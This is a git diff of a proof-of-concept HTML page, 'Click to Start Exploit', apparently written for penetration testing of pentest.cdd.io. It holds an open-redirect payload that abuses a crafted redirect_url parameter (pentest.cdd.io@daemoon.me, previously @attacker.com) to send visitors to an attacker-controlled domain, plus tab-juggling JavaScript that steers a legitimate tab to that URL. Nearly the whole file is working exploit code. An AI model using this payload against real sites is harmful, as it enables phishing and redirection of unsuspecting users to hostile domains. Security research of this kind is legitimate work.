@@ -8,7 +8,7 @@
   <h1>Click to Start Exploit</h1>
   <button onclick="runExploit()">Start</button>
 
-  <script>
+  <!-- <script>
     function runExploit() {
       // Step 1: Open real site in a new tab
       const triggerTab = window.open("https://pentest.cdd.io/", "_blank");
@@ -25,10 +25,30 @@
       // Step 3: Wait a bit more, then open redirect payload tab
       setTimeout(() => {
         window.open(
-          "https://pentest.cdd.io/?redirect_url=https%3A%2F%2Fpentest.cdd.io%40attacker.com",
+          "https://pentest.cdd.io/?redirect_url=https%3A%2F%2Fpentest.cdd.io%40daemoon.me",
           "_blank"
         );
       }, 3000);
+    }
+  </script> -->
+  <script>
+    function runExploit() {
+      // Step 1: Open first tab (legit site)
+      const tab1 = window.open("https://pentest.cdd.io/", "tab1");
+
+      // Step 2: Open second tab (attacker-controlled domain)
+      const tab2 = window.open("https://pentest.cdd.io/?redirect_url=https%3A%2F%2Fpentest.cdd.io%40daemoon.me", "tab2");
+
+      // Step 3: Redirect the first tab to the second tab's URL
+      setTimeout(() => {
+        try {
+          if (tab1 && tab2) {
+            tab1.location.href = tab2.location.href;
+          }
+        } catch (e) {
+          console.error("Redirection failed:", e);
+        }
+      }, 1000); // wait a second to allow pages to load
     }
   </script>
 </body>
